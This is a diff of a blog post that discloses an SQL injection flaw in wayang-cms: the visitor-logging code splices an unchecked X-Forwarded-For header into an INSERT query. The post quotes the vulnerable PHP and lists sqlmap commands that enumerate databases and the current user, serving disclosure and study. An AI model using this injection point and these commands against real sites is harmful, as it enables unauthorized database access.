@@ -6,7 +6,7 @@
 
 <title>wayang-cms SQL injection vulnerability | lowliness9的博客</title>
 
-<link rel="shortcut icon" href="https://lowliness9.github.io/favicon.ico?v=1605356357147">
+<link rel="shortcut icon" href="https://lowliness9.github.io/favicon.ico?v=1605356876323">
 
 <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
 <link rel="stylesheet" href="https://lowliness9.github.io/styles/main.css">
@@ -77,7 +77,7 @@
             
         </div>
         <div style="text-align: center">
-            <form id="gridea-search-form" style="position: relative" data-update="1605356357147" action="/search/index.html">
+            <form id="gridea-search-form" style="position: relative" data-update="1605356876323" action="/search/index.html">
                 <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
                 <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
             </form>
@@ -93,7 +93,7 @@
                 </h2>
                 <div class="post-info">
                     <time class="post-time gt-c-content-color-first">
-                        · 2020-11-14 ·
+                        · 2019-01-03 ·
                     </time>
                     
                 </div>
@@ -103,6 +103,32 @@
 <h3 id="2build-a-recurring-environment">2.Build a recurring environment</h3>
 <p>Download and install phpStudy, download wayang-cms and copy all files inside to phpStudy's web directory, connect to mysql and create a new database wayang-cms, start Apache to access <code>http://127.0.0.1/wy_install/</code> set up installation. After the installation is complete, import cms.sql in wy_install into the database, and the successful operation is as follows<br>
 <img src="https://lowliness9.github.io/post-images/1605356351107.png" alt="" loading="lazy"></p>
+<h3 id="3vulnerability-analysis">3.Vulnerability analysis</h3>
+<p>The reason for the vulnerability is that the system did not perform any security verification on the visitor's IP address when recording the visitor's IP, and directly spliced the data passed by the user into the SQL statement for execution. The location of the vulnerability is in lines 8 to 10 of <code>wy_controlls/wy_side_visitor.php</code>. In line 8 of the code, the IP address, browser, time, etc. of the user accessing the system are spliced with SQL statements using the <code>Insert</code> keyword. The code uses the ip() method to obtain the visitor's IP address.<br>
+<img src="https://lowliness9.github.io/post-images/1605352424803.png" alt="" loading="lazy"><br>
+Locate the file of the ip() method to view the specific implementation. This method is located in <code>wy_controlls/wy_side_visitor.php</code>. You can see through the code that if there are fields such as X-Forwarded-For in the HTTP request header, it will be taken directly from the HTTP request header Value and return.<br>
+<img src="https://lowliness9.github.io/post-images/1605352606597.png" alt="" loading="lazy"><br>
+Attackers can submit dirty data for malicious SQL injection.</p>
+<pre><code class="language-php">$queryi=&quot;INSERT INTO `wy_visitor`(`visitor_ipaddress`, `visitor_user_agent`, `visitor_date`, `visitor_online`, `visitor_online_status`) 
+  VALUES ('&quot;.ip().&quot;','&quot;.$browser.&quot;',CURDATE(),CURRENT_TIMESTAMP,1) ON DUPLICATE KEY UPDATE `visitor_online`=CURRENT_TIMESTAMP, `visitor_online_status`=1&quot;;
+$row=$conn-&gt;query($queryi);
+</code></pre>
+<h3 id="4vulnerability-proof">4.Vulnerability proof</h3>
+<p>The tools used are sqlmap and burpsuite. Visit the homepage of the website and capture the package, and add the X-Forwarded-For: 8.8.8.8 field, and add the * sign after 8.8.8.8 for the purpose of allowing sqlmap to identify the injection point.<br>
+<img src="https://lowliness9.github.io/post-images/1605354299986.png" alt="" loading="lazy"><br>
+Save the data package as vul.txt and use sqlmap to verify, execute the following command.</p>
+<pre><code>python2 sqlmap.py -r vul.txt --batch -v 3 --risk 3 --level 5 
+</code></pre>
+<p><img src="https://lowliness9.github.io/post-images/1605354487105.png" alt="" loading="lazy"><br>
+Try to get the database name of the system</p>
+<pre><code>python2 sqlmap.py -r vul.txt --batch -v 3 --risk 3 --level 5 --dbs
+</code></pre>
+<p><img src="https://lowliness9.github.io/post-images/1605354592521.png" alt="" loading="lazy"><br>
+Try to get the current user of the database</p>
+<pre><code>python2 sqlmap.py -r vul.txt --batch -v 3 --risk 3 --level 5 --current-user
+</code></pre>
+<p><img src="https://lowliness9.github.io/post-images/1605355125688.png" alt="" loading="lazy"><br>
+It is found through testing that the vulnerability exists and can be exploited.</p>
 
                 </div>
             </article>
@@ -111,8 +137,8 @@
         
             <div class="next-post">
                 <div class="next gt-c-content-color-first">下一篇</div>
-                <a href="https://lowliness9.github.io/post/q0Pbc2skt/" class="post-title gt-a-link">
-                    一次对外挂网站真实IP的溯源
+                <a href="https://lowliness9.github.io/post/GfCcOU7hX/" class="post-title gt-a-link">
+                    wayang-cms SQL注入漏洞
                 </a>
             </div>
         
